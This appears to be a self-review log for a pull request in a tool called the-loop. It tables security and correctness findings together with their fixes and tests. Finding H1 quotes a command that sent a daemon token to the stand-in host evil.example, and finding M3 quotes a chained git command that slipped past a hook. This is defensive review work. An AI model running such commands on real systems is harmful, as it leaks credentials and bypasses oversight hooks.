# Self-review (issue-447)

The policy is this repository's `reviews` block: up to 3 self rounds and 3 critic rounds,
stop when a round finds nothing new, and escalate a repeated finding. No critic harness
is declared (`critics: []` in `.the-loop/cli-config.yaml`), so no critic round ran. The
self rounds read the branch diff against `b473ced` adversarially: round 1 was the
author's, and round 2 was a separate reviewing agent with no part in writing the code.

## Round 1: the author's read

| # | Finding | Fix | Test |
|---|---------|-----|------|
| S1 | `current_branch` used `git rev-parse --abbrev-ref HEAD`, which fails on a branch with no commits yet (a fresh checkout), so `pr create` refused a real branch | `git symbolic-ref --short -q HEAD`: it answers on an unborn branch and is silent on a detached HEAD | `test_pr_create_opens_from_the_checked_out_branch`, `test_link_pr_discover_links_the_branchs_pull_request` |
| S2 | the CLI tests' `--config` set a process-wide override that leaked into later tests (`test_graph_catalog` went red in the full run) | an autouse fixture clears the override after each test | full suite |
| S3 | the design gave the `link_pull_request` MCP tool `discover`, and the code did not | `discover`, `branch` and `repository` on the tool | `test_link_pull_request_can_discover` |
| S4 | the new event names used `work-item.` (hyphen), which the catalogue's drift test cannot see and no namespace uses | renamed to `work_item.*` and added to `EVENT_TYPES` | `test_every_emitted_event_type_is_documented` |
| S5 | the testing plan claimed an integration assertion on `work-item-state.json` that the test does not make (that write is issue-368's and already covered) | T4 reworded | none |
| S6 | the poller integration double had a scenario helper named `close_issue`, which the new client method of that name made an incompatible override (pyright) | renamed to `close_upstream` | pyright, `test_poller_integration.py` |

## Round 2: an independent reviewer

| # | Severity | Finding | Outcome |
|---|----------|---------|---------|
| H1 | high | a host was shape-checked only, so `the-loop pr status https://evil.example/o/r/pull/1` (or a cross-site GET to the loopback route) made the service send the daemon's token to `https://evil.example/api/v3` | **fixed.** `_trusted` admits only github.com and the operator's host, in every operation, before any client call (R2.5, D7). Test: `test_abuse_447_a3_a_host_the_operator_did_not_configure_is_refused` (8 operations) |
| M2 | medium | `pr merge` merges any PR the token can merge, not only one recorded against a registered work item | **fixed.** `--sha` pins the reviewed head, `merged: false` is exit 1, and, once the owner answered the escalation, every lifecycle act requires a registered work item (see *The owner's review* below) |
| M3 | medium | the hook's own-verb exclusion matched anywhere in the command: `git commit -m "the-loop pr create" && git push` and a `loop/…-the-loop-pr-create` branch suppressed a real push | **fixed.** Triggers are decided per segment and anchored at the segment's start. Test: `test_the_trigger_is_decided_per_segment` |
| M4 | medium | after an MCP `create_pull_request`, discovery used the checkout's branch, not the head the tool used; a fork PR lives upstream | **fixed for MCP**: the tool's `head`, `owner` and `repo` become `--branch`/`--repository` when they are name shapes (`test_an_mcp_creation_is_discovered_on_its_own_head_and_repository`, `test_abuse_447_a6_hostile_mcp_input_never_reaches_the_argv`). **The fork case is fixed too**, after the owner asked for it: `--head-owner`, and discovery also asks the work item's repository |
| L5 | low | `--discover` used any origin's last two path segments (a GitLab origin queried GitHub) | **fixed.** `ghhost.origin_github_repo` uses the origin only on a trusted GitHub host. Test: `test_discovery_ignores_an_origin_that_is_not_on_github` |
| L6 | low | a running service older than the CLI turned every verb into `error: Not Found` | **fixed.** A bare 404/405 from the route falls back in-process with `STALE_SERVICE_NOTE`. Tests: `test_a_service_older_than_the_verb_falls_back_loudly`, `test_a_real_404_from_the_service_is_not_swallowed` |
| L7 | low | `pr create` keyed the link with the caller's spelling of `--repository` | **fixed.** The ref is built from the returned `html_url`. Test: `test_pr_create_keys_the_link_by_githubs_own_spelling` |
| L8 | low | `merged: false` printed success; a PR number 0 was exit 1, not 2 | **fixed.** Tests: `test_a_merge_github_did_not_do_is_exit_1`, `test_a_zero_pull_request_number_is_a_caller_mistake` |

## Round 3

This round re-read the fixes above: the guard's call sites (all ten `_trusted` calls),
the segment regexes against the reviewer's three commands and ten more, and the stale
fallback's two error shapes. No new finding, so the rounds stop.

## The owner's review

The owner answered on the PR
([comment](https://github.com/MadaraUchiha-314/the-loop/pull/448#issuecomment-5917395935)):

| Ask | Outcome |
|-----|---------|
| close a ticket, resolve a review thread and discover a fork's PR in this PR, not a follow-up | **done.** `ticket close`, `pr resolve-thread` (a thread of that PR only) and `--head-owner` fork discovery, each with a route, an MCP tool, docs and tests |
| an action the-loop takes on a PR, like merging it, should have a registered work item, with `the-loop do` as an exception | **done.** `_authority` gates `pr create`, `pr merge`, `pr resolve-thread` and `ticket close`: the target must be, or be recorded against, a work item registered on the executing instance, or be named by an ad-hoc `do` work item (R1.10, decision-140 D8). The manager routes these acts to the member that manages the work item |

## Noted, not changed

- `the-loop ask` (issue-208) has the same host shape-check, but it runs in-process only,
  on the session's own token, so no daemon token is at stake. Bringing it under
  `trusted_hosts` is a one-line follow-up outside this ticket.
